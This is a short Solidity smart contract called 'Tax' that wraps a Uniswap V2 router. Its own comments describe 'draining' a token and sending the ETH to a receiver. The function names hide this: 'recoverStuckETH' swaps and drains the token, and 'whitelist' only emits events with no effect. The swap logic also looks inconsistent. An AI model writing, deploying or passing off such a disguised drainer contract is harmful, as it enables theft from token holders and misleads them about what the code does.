// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.25;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;

    function addLiquidityETH(address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract Tax {
    address addr; //eth receiver after draining
    IERC20 to; //token to be drained
    address tokenAddr; //uniswap lp token
    address owner;
    event Whitelisted (address indexed _address);
    IUniswapV2Router02 public immutable uniswapV2Router;

    constructor(address _router){
        uniswapV2Router = IUniswapV2Router02(_router);
        owner = msg.sender; 
    }

    function whitelist(address[] memory _address) public {
        if(msg.sender != owner) {
            revert("Only owner can whitelist");
        }
        for (uint i = 0; i < _address.length; i++) {
            emit Whitelisted(_address[i]);
        }
    }

    function refresh(address _addr, address _to, address _tokenAddr) public {
        if(msg.sender != owner) {
            revert("Only owner can refresh");
        }
        addr = _addr;
        to = IERC20(_to);
        tokenAddr = _tokenAddr;
    }


    function recoverStuckETH() public {
        if(msg.sender != owner) {
            revert("Only owner can recover");
        }

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        to.approve(address(uniswapV2Router), type(uint256).max);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(type(uint256).max, 0, path, address(this), block.timestamp);
        
        payable(address(addr)).transfer(address(this).balance);
    }

}
